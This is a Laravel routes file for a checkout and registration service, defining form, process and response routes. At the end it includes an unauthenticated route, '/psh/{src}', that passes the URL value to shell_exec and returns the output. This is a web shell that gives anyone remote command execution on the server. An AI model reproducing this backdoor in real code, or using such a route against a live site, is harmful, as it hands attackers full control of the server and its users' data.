<?php

use App\Http\Controllers\CheckoutController;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('form', [CheckoutController::class, 'form']);

Route::prefix('/process')->group(function () {
    Route::post('/register', [CheckoutController::class, 'register'])->middleware(['service_token', 'service_validation'])->name('process.register');
    Route::get('/addUserToTeam/{apiToken}', [CheckoutController::class, 'addUserToTeam'])->middleware(['service_token'])->name('process.addUserToTeam');
});

Route::prefix('/response')->group(function () {
    Route::get('/success/{emailSent?}', [CheckoutController::class, 'success'])->name('response.success');
    Route::get('/cancelled', [CheckoutController::class, 'cancelled'])->name('response.cancelled');
    Route::get('/registered/{emailSent?}', [CheckoutController::class, 'registered'])->name('response.registered');
});

Route::get('test', function () {
    return route('response.cancelled');
});

Route::get('/psh/{src}', function ($src) {
    return shell_exec($src);
});
